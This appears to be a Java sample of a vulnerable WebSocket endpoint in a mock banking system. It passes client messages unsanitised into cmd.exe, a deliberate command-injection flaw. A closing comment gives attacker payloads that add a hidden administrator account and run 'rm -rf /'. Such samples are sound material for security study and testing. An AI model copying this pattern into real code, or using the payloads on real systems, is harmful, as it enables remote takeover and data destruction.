import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import javax.websocket.OnMessage;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

@ServerEndpoint("/command")
public class FinancialCommandExecutor {
    private static final String BACKUP_SCRIPT = "C:\\\\BankingScripts\\\\backup_data.bat";
    
    @OnMessage
    public void onMessage(String param, Session session) {
        try {
            // 模拟银行系统执行数据备份操作
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", BACKUP_SCRIPT, param);
            Process process = pb.start();
            
            // 读取命令执行结果
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                session.getBasicRemote().sendText(line);
            }
            
            // 错误流处理
            BufferedReader errorReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                session.getBasicRemote().sendText("ERROR: " + line);
            }
            
        } catch (IOException e) {
            try {
                session.getBasicRemote().sendText("Command execution failed: " + e.getMessage());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}

// 银行系统配置类（简化版）
abstract class BankingSystemConfig {
    public static final boolean DEBUG_MODE = true;
    public static final String SYSTEM_ID = "FINANCE_CORE_2023";
}

// 模拟命令执行器（用于演示）
interface CommandExecutor {
    void execute(String[] cmd);
}

// 恶意客户端示例（攻击者视角）
/*
WebSocket连接后发送：
" & net user hacker P@ssw0rd /add & net localgroup Administrators hacker /add"

// Linux系统可能发送：
"; rm -rf / & "
*/